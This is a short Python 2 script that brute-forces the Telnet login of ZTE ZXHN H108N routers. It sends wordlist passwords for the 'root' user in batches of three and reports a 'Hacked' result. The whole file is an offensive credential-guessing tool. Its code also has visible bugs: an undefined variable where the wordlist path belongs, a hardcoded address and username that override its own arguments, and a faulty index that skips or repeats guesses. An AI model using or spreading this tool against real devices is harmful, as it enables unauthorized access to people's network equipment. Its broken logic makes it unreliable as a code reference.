#!/usr/bin/env python

#ZTE_Hacking

# execfile('/home/ligeti/Scripts/ZTE_Script.py')
import telnetlib
import time
from sys import stdout
import argparse
import socket

def main():
    #Getting the argments
    progInfo = 'This is a brute-force tool build to crack the ZTE ZXHN H108N Telnet password. For more information, check: https://jalalsela.com/hacking-zxhn-h108n-router/'
    footer = 'Create by: Jalal Sela (Ligeti)'

    parser = argparse.ArgumentParser(description = progInfo, epilog=footer)
    #group = parser.add_mutually_exclusive_group()
    parser.add_argument('-a', '--addr', help='The IP address of ZTE AP (default: 192.168.1.1)', default='192.168.1.1')
    parser.add_argument('-u', '--user',  help='Username to use (default: root)', default='root')
    requiredNamed = parser.add_argument_group('required named arguments')
    requiredNamed.add_argument('-w', '--wordlist', help='The path to the worldlist', required=True)
    #to be added
    #parser.add_argument('-p', '--password', action='store_true', help='Password to use (default: public)', default='public')
    
    args = parser.parse_args()

    print 'Address: ' + args.addr
    print 'Username: ' + args.user    
    print 'Wordlist: ' + args.wordlist 
    #print 'Password: ' + args.password

    # Load the wordlist file
    with open(wordlist, 'r+') as f:
        # Read the file
        lines = f.readlines()
        # Telnet
        connection = telnetlib.Telnet()

        chk = 'NULL'
        # Testing
        max = len(lines)
        password = lines[0]
        i = 0
        while True:
            try:
                # Connect to the router (Telnet)
                #if ('closed' in chk):
                connection.open('192.168.1.1')
                # Read until the server/Router asks for username
                chk = connection.read_until('Username:')
                # Send the username (root)
                connection.write('root\n')
                # Read until the server/Router asks for password!
                chk = connection.read_until('Password:')

                # We have three chances before we lose the connection.
                for x in range (0,3):
                    i += x
                    password = lines[i]
                    print 'Test (%d/%d):  %s'%(i, x, password)
                    connection.write(password)

                    chk = connection.read_until('Password:', 1)
                    print 'Results(%d): %d\t%s\n.............................'%(i, len(chk), chk)
                    
                    if ('Bad' not in chk  and len(chk) > 2):
                        print '------------------------------\nHacked: ' + password
                        print 'Data: %d %d %s\n------------------------------'%(i, len(chk), chk)
                        exit()
                connection.close()                
                i += 1;
                time.sleep(0.1)
            except Exception, e:
                print 'Error (' + time.ctime(time.time()) + '): ' + str(e)
    exit()
if __name__=="__main__":
    main()
